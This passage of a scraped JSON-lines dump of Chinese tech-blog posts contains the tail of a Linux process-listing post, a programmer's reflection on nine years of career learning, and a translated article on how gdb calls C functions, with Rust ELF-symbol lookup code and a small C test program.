id=\"crayon-5b4aa93249adf543577228-3\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25342</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1142</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sshd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">shs</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">priv</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249adf543577228-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ps</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ef</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grep </span><span class=\"crayon-v\">daemon</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grep</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249adf543577228-5\"><span class=\"crayon-v\">message</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">790</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Oct19</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">01</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dbus</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">daemon</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">system</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">address</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">systemd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">nofork</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">nopidfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">systemd</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">activation</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93249adf543577228-6\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">836</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Oct19</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">02</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">accountsservice</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">accounts</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">daemon</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93249adf543577228-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0036 seconds] -->\r\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113905\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113905votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113905\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113905/", "url_obj_id": "617147c254639a1116c63b146f58b2e8"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/03/2b70b826c50f6f6721d816371ec7fd6a.jpg"], "title": "九年程序人生", "create_date": "2018/06/14 ·", "praise_num": 1, "fav_num": 1, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/flame7/p/9110579.html\">flame7</a>   </div><p>时间一晃而过，大学毕业转眼间已经工作9年了，总结一下自己这些年来感受。</p>\n<h2><strong>与程序打交道的人生，是简单的人生</strong></h2>\n<p>一次做规划局的项目，规划局的职员很是钦佩地说：“你们真了不起，在电脑上敲敲键盘就能做出软件来。”，</p>\n<p>规划局领导说：“跟电脑打交道是最简单的，难的是跟人打交道。”。</p>\n<p>领导的话很有深意，一语道破了本质，做程序的人，是比较简单的。</p>\n<h2><strong> 不懂什么叫编程</strong></h2>\n<p>大学本科，读“计算机科学与技术专业”（相信看这篇博客的人多半也是学这个专业的 ^_*），课程重理论而轻实践。</p>\n<p>最初学习C语言，对于编程没有任何概念，我清楚的记得，一次在课堂上问老师：“计算机输入法，可视化操作界面已经很完善了，为什么要用C语言中 Print() 函数输出一段字符呢？而且我们学习使用Console控制台的黑白屏输入输出，也不像是平时使用的软件啊？”。</p>\n<p>老师听后也是一脸的懵逼，说：“你好好学，慢慢就明白了”。</p>\n<p>你不懂的，老师也没法回答你，只有靠自己慢慢地摸索，慢慢去领悟。</p>\n<h2><strong>Java还是C#，平台选择的爱恨情仇</strong></h2>\n<p>初学Java，这是我接触的第一个最具有实用意义的编程语言（可以做网站，做软件，虽然C语言，C++也可以开发应用软件，但毕竟使用的人较少，对于初学者，找到一个合适的教程都困难）。当时的学习，基本是自学，上网下载视频教程，一集一集地看，不懂的概念上网查，去图书馆借阅相关书籍资料，什么JSP标签，Servlet，JDBC，到Struts MVC，Hibernate，Spring，设计模式，半年时间，算是初步入门，尽管对知识还是一知半解，但还是成功用Java做了毕业设计，做过几个小程序。</p>\n<p>工作之后，开始使用C#，算是与.NET平台结缘，一行一行地敲代码，一个接一个的做项目，一版又一版的升级软件，一晃9年了。从最初的ASP.NET WebForm，ADO.NET，到ASP.NET MVC，WebAPI，EntityFramework，面向服务架构的WCF，以及最新的跨平台.NET Core，微软为软件开发人员，提供了编程最大的便利性。</p>\n<p>仅从开发语言本身角度讲，C#并不比Java差，并且很多细微的地方，C#比Java做的要好，比如，C#中的get，set属性访问，要比Java的字段访问方便很多，相同逻辑代码运行效率方面，C#的MSIL比Java的字节码允许效率还要稍微高一些，但是无奈，.NET平台发展始终不及Java平台。诚然，平台的发展不能仅从开发语言本身考虑，平台运行环境，平台参与人员整体水平，使用成本等，更是起着决定性作用，.NET平台在互联网大潮中，逐渐被边缘化，免费的Java平台，被开源社区拥抱，成为互联网项目开发平台的中流砥柱。微软似乎意识到问题所在，逐步加入开源队伍，并提供了跨平台方案.Net Core，但并没有明显起色，.NET平台开发人员心中不免有一丝悲观情绪，.Net平台开发人员似乎比Java开发人员始终矮一头的感觉。</p>\n<h2><strong> 前端编程，JavaScript从无知到觉醒</strong></h2>\n<p>做Web开发，离不开HTML，CSS，JavaScript，尽管日常工作以后台开发为主，但接触的多了，慢慢地理解深入，从只会使用JS写函数，发展到使用JS面向对象的功能，理解了JS中闭包的概念（好烧脑，用离散数学中的概念来表示函数集合，让没学过集合概念的同学情何以堪）。明白了JS的面向对象编程，通过JS自定义前端控件，数据与逻辑代码分离，达到优雅地实现前端逻辑。学习的过程是曲折的，有时候一个概念始终理解不了，但一旦明白过来，会有一种眼前一亮，豁然开朗的感觉。起初一直不明白，为什么JQuery中的“$”这么牛，一个“$”符号能操作一切，读过JQuery源码之后才明白，这个“$”原来是jQuery在Window中定义的的一个变量，同时也是jQuery这个函数的别名，每次调用$(…)时，其实间接地创建了一个JQuery的示例。当然，这种操作得益于JS是一直动态语言，可以给对象任意添加属性和方法（相比较Java和C#是不能这样操作的）。</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fsb1rtwtcfj20hu05n74a.jpg\"></p>\n<h2>技术之路要不断学习，路漫漫其修远</h2>\n<p>技术更新迭代的速度，远超想象，往往是刚学会一个新技术，另一个更新的技术又变的火热，似乎新技术的产生，也在遵循一个摩尔定律。追赶技术的脚步，就如同夸父追日一般，你一直在追赶，但它一直在你前面。好在，每一个新技术，新架构的产生，都是在为更简单、更高效的解决现有的问题，所以，新的技术，虽然增加了学习的负担，但是新技术的应用，能够解决现实的问题，是效率的提升。从这个角度讲，学习是值得的。通常来说，没有谁天生就会做什么，只要肯学习，别人能做到的，你也能做到。</p>\n<p>React火热的时候，学习React，了解了这种基于模板的开发方式，见识了这种类似于MVC，实现数据与业务逻辑分离的编程方式在JS中的实际应用，对于这种仅需要一个render()函数的超简洁的框架赞叹不已。</p>\n<p>Facebook搞出了React，国人也不示弱，于是诞生了Vue，相对来说更简洁，使用更方便。</p>\n<p>React发展出了React Native，圈子里更是为止振奋，为火热的移动端开发又添了一把柴，让移动端开发，在Android和IOS原生开发之外，又多了一种全新的选择。</p>\n<p>我用3天时间，学会了开发微信小程序，完成了原有Web功能向小程序的移植。</p>\n<p>Node.JS火热的时候，我用了一周的业余时间，学习NodeJS编程，配合MongoDB，搭建了简单的日志系统。</p>\n<p>说起来有点吹牛的意思，但却是事实。</p>\n<p>一方面，不管是React，微信小程序，Node.JS，本质上都是JavaScript，Html，CSS的组合使用，相似度很高，只是各自有各自特点的规范特色而已，学习难度是逐渐降低的。</p>\n<p>另一方面，我相信大多数人也有感受，当工作经验，认知水平达到一定积累之后，学习其实是一件水到渠成的事情。</p>\n<h2>总结</h2>\n<p>有一次跟朋友聊天，朋友说，“感觉自己越学习，越感觉到不懂的方面更多了”。</p>\n<p>我笑笑，表示同意他的观点，这是一个叫做“知识边界”的问题，每个人的知识，就如同是一个圆，圆内是你已经了解的知识，圆之外就是还不懂的知识，一个人掌握的知识越多，这个圆也就越大，而圆越大，圆周所接触的那些未知领域也就越多。如果一个人说自己没有什么不懂的，那只能说明他知识面太小。如此，当我们意识到自己有很多不懂的东西的时候，也不用焦虑，因为我们的知识在扩展，保持一颗开放，学习的心，这是人生路上所必须的。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114124\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114124votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114124\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,工作", "url": "http://blog.jobbole.com/114124/", "url_obj_id": "c7bbdb3c6c79c01bffbefa062036a56f"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/099ab3d51f135a121ab1ae294f13298a.jpg"], "title": "gdb 如何调用函数？", "create_date": "2018/04/30 ·", "praise_num": 1, "fav_num": 3, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://jvns.ca/blog/2018/01/04/how-does-gdb-call-functions/\"> Julia Evans</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9588-1.html\">linux</a>   </div><p>在这周，我发现我可以从 gdb 上调用 C 函数。这看起来很酷，因为在过去我认为 gdb 最多只是一个只读调试工具。</p>\n<div id=\"article_content\">\n<p>我对 gdb 能够调用函数感到很吃惊。正如往常所做的那样，我在 <a href=\"https://twitter.com/b0rk/status/948060808243765248\">Twitter</a> 上询问这是如何工作的。我得到了大量的有用答案。我最喜欢的答案是 <a href=\"https://github.com/eklitzke/ptrace-call-userspace/blob/master/call_fprintf.c\">Evan Klitzke 的示例 C 代码</a>，它展示了 gdb 如何调用函数。代码能够运行，这很令人激动！</p>\n<p>我（通过一些跟踪和实验）认为那个示例 C 代码和 gdb 实际上如何调用函数不同。因此，在这篇文章中，我将会阐述 gdb 是如何调用函数的，以及我是如何知道的。</p>\n<p>关于 gdb 如何调用函数，还有许多我不知道的事情，并且，在这儿我写的内容有可能是错误的。</p>\n<h1 id=\"toc_1\">从 gdb 中调用 C 函数意味着什么？</h1>\n<p>在开始讲解这是如何工作之前，我先快速的谈论一下我是如何发现这件令人惊讶的事情的。</p>\n<p>假如，你已经在运行一个 C 程序（目标程序）。你可以运行程序中的一个函数，只需要像下面这样做：</p>\n<ul>\n<li>暂停程序（因为它已经在运行中）</li>\n<li>找到你想调用的函数的地址（使用符号表）</li>\n<li>使程序（目标程序）跳转到那个地址</li>\n<li>当函数返回时，恢复之前的指令指针和寄存器</li>\n</ul>\n<p>通过符号表来找到想要调用的函数的地址非常容易。下面是一段非常简单但能够工作的代码，我在 Linux 上使用这段代码作为例子来讲解如何找到地址。这段代码使用 <a href=\"https://cole14.github.io/rust-elf\">elf crate</a>。如果我想找到 PID 为 2345 的进程中的 <code>foo</code> 函数的地址，那么我可以运行 <code>elf_symbol_value(\"/proc/2345/exe\", \"foo\")</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9315fd6e402863126\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfn elf_symbol_value(file_name: &amp;str, symbol_name: &amp;str) -&gt; Result&lt;u64, Box&lt;std::error::Error&gt;&gt; {\r\n    // 打开 ELF 文件 \r\n    let file = elf::File::open_path(file_name).ok().ok_or(\"parse error\")?;\r\n    // 在所有的段 &amp; 符号中循环，直到找到正确的那个\r\n    let sections = &amp;file.sections;\r\n    for s in sections {\r\n        for sym in file.get_symbols(&amp;s).ok().ok_or(\"parse error\")? {\r\n            if sym.name == symbol_name {\r\n                return Ok(sym.value);\r\n            }\r\n        }\r\n    }\r\n    None.ok_or(\"No symbol found\")?\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd6e402863126-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd6e402863126-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd6e402863126-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd6e402863126-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd6e402863126-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd6e402863126-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd6e402863126-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd6e402863126-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd6e402863126-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd6e402863126-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd6e402863126-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd6e402863126-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd6e402863126-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd6e402863126-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd6e402863126-1\"><span class=\"crayon-e\">fn </span><span class=\"crayon-e\">elf_symbol_value</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">file_name</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">str</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">symbol_name</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">str</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Result</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">u64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Box</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">std</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">error</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">Error</span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd6e402863126-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 打开 ELF 文件 </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd6e402863126-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">let </span><span class=\"crayon-v\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">elf</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">File</span><span class=\"crayon-o\">::</span><span class=\"crayon-e\">open_path</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">file_name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">ok</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">ok_or</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"parse error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">?</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd6e402863126-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 在所有的段 &amp; 符号中循环，直到找到正确的那个</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd6e402863126-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">let </span><span class=\"crayon-v\">sections</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sections</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd6e402863126-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sections</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd6e402863126-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sym </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get_symbols</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">ok</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">ok_or</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"parse error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd6e402863126-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sym</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">symbol_name</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd6e402863126-9\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Ok</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sym</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd6e402863126-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd6e402863126-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd6e402863126-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd6e402863126-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">None</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">ok_or</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"No symbol found\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd6e402863126-14\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>这并不能够真的发挥作用，你还需要找到文件的内存映射，并将符号偏移量加到文件映射的起始位置。找到内存映射并不困难，它位于 <code>/proc/PID/maps</code> 中。</p>\n<p>总之，找到想要调用的函数地址对我来说很直接，但是其余部分（改变指令指针，恢复寄存器等）看起来就不这么明显了。</p>\n<h1 id=\"toc_2\">你不能仅仅进行跳转</h1>\n<p>我已经说过，你不能够仅仅找到你想要运行的那个函数地址，然后跳转到那儿。我在 gdb 中尝试过那样做（<code>jump foo</code>），然后程序出现了段错误。毫无意义。</p>\n<h1 id=\"toc_3\">如何从 gdb 中调用 C 函数</h1>\n<p>首先，这是可能的。我写了一个非常简洁的 C 程序，它所做的事只有 <code>sleep</code> 1000 秒，把这个文件命名为 <code>test.c</code> ：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9315fd78942079532\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;unistd.h&gt;\r\nint foo() {\r\n    return 3;\r\n}\r\nint main() {\r\n    sleep(1000);\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" 